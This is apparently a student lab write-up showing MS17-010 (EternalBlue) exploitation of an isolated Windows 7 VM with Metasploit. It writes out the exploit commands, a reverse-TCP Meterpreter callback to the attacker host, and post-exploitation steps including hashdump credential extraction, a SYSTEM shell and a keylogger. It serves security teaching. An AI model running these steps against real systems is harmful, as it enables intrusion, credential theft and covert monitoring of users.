# Metasploit Basics – EternalBlue Exploitation & Meterpreter Post-Exploitation

## Overview

This lab demonstrates a full exploitation cycle against an unpatched Windows 7 host using Metasploit Framework. The attack leverages MS17-010 (EternalBlue), a critical SMBv1 vulnerability first disclosed in the Shadow Brokers leak and weaponized globally in the 2017 WannaCry and NotPetya campaigns. After gaining a Meterpreter shell, post-exploitation techniques are performed including remote screenshot capture, command shell spawning, SAM database extraction, and live keylogging — the same capabilities an adversary would use during the credential-access and collection phases of an intrusion.


---

## Environment

| Component | Details |
|---|---|
| Attacker OS | Kali Linux (kali / kali) |
| Target OS | Windows 7 Professional SP1 x64 |
| Network | VirtualBox NAT Network — MultimachineNAT (10.0.5.0/24) |
| Attacker IP | 10.0.5.7 |
| Target IP | 10.0.5.8 |
| Framework | Metasploit Framework 6 (msfconsole) |
| Exploit | `exploit/windows/smb/ms17_010_eternalblue` |
| Payload | `windows/x64/meterpreter/reverse_tcp` (default) |
| Listener Port | TCP 4444 |

---

## Walkthrough

### 1. Pre-Exploitation Baseline — Confirming Port 4444 Is Closed

Before launching the exploit, a baseline `netstat -an` was run on the Windows 7 target to confirm port 4444 was not yet open, establishing a clean before/after comparison.

```
C:\Users\student> netstat -an
...
TCP    0.0.0.0:135    0.0.0.0:0    LISTENING
TCP    0.0.0.0:445    0.0.0.0:0    LISTENING
...
(port 4444 absent)
```

### 2. Launching msfconsole and Loading the Exploit

```bash
msfconsole
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.0.5.8
RHOST => 10.0.5.8
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

Metasploit first runs an SMB scanner check, confirming the target is vulnerable before proceeding:

```
[*] Started reverse TCP handler on 10.0.5.7:4444
[*] 10.0.5.8:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.0.5.8:445  - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 SP1 x64
[*] 10.0.5.8:445 - Connecting to target for exploitation.
[+] 10.0.5.8:445 - Connection established for exploitation.
[*] 10.0.5.8:445 - CORE raw buffer dump (42 bytes)
[+] 10.0.5.8:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending stage (203846 bytes) to 10.0.5.8
[+] Meterpreter session 1 opened (10.0.5.7:4444 → 10.0.5.8:49160) at 2025-02-09 20:26:23 -0500
meterpreter >
```

The exploit sends carefully crafted SMBv1 packets that trigger a pool overflow in the Windows kernel, allowing arbitrary code execution. The default payload (`windows/x64/meterpreter/reverse_tcp`) initiates a reverse connection back to the attacker's handler on port 4444.

### 3. Post-Exploitation Confirmation — Port 4444 ESTABLISHED

A second `netstat -an` on the Windows 7 VM confirmed the active Meterpreter connection:

```
TCP    10.0.5.8:49160    10.0.5.7:4444    ESTABLISHED
```

### 4. Remote Screenshot Capture

```
meterpreter > screenshot
Screenshot saved to: /home/kali/muukVvhq.jpeg
```

The `screenshot` command captures the current display of the target and saves it locally to the attacker machine. The resulting image showed the Windows 7 desktop with the open `cmd.exe` netstat window — visually confirming remote control.

### 5. Remote Command Shell and Directory Creation

```
meterpreter > shell
Process 2920 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]

C:\Windows\system32> mkdir C:\Users\student\Desktop\EmmanuelGuillen
mkdir C:\Users\student\Desktop\EmmanuelGuillen

C:\Windows\system32> exit
meterpreter >
```

Dropping into a native Windows command shell via Meterpreter allows execution of arbitrary OS commands as SYSTEM. The `mkdir` command created a directory on the victim's desktop, verifiable from either the attacker or victim side.

### 6. SAM Database Extraction (Credential Harvesting)

```
meterpreter > hashdump
admin:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1001:aad3b435b51404eeaad3b435b51404ee:9882b8196124ddc8fdeb3238026f8f30:::
meterpreter >
```

`hashdump` reads the SAM (Security Account Manager) database and SYSTEM hive directly from memory, bypassing file-level protections. The output is in the format `username:RID:LM_hash:NTLM_hash`. The NTLM hashes can be cracked offline (e.g., with Hashcat or John the Ripper) or used directly in pass-the-hash attacks.

### 7. Live Keylogger

```
meterpreter > keyscan_start
Starting the keystroke sniffer ...

meterpreter > keyscan_dump
Dumping captured keystrokes ...
<^H><Right Shift>Emmanuel <Right Shift>Guillen<CR>
<Right Shift><Right Shift><Right Shift>I guess my keystrokes are being recorded, <Right Shift>I<^H>we will see if it works.

meterpreter > keyscan_stop
Stopping the keystroke sniffer ...
meterpreter >
```

`keyscan_start` injects a keylogger into the currently migrated process. Every keystroke typed on the target — including passwords, search queries, and chat messages — is buffered and retrievable via `keyscan_dump` at any time during the session. This is one of the most impactful post-exploitation capabilities for credential theft in a live environment.

---

## Skills Demonstrated

- Exploitation of MS17-010 (EternalBlue) against a Windows SMBv1 target
- Meterpreter shell establishment and session management
- Remote screenshot capture for situational awareness
- Native Windows command shell spawning via Meterpreter
- SAM/NTLM hash extraction using `hashdump`
- Live keylogger deployment, dump, and cleanup
- Network state validation with `netstat` before/after exploitation
- Understanding of reverse TCP payload mechanics

---

## References

- [MS17-010 Microsoft Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [CVE-2017-0144 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [Metasploit Framework Documentation](https://docs.metasploit.com/)
- [Meterpreter Command Reference](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
- MITRE ATT&CK: [T1210 – Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/), [T1003.002 – SAM](https://attack.mitre.org/techniques/T1003/002/), [T1056.001 – Keylogging](https://attack.mitre.org/techniques/T1056/001/)
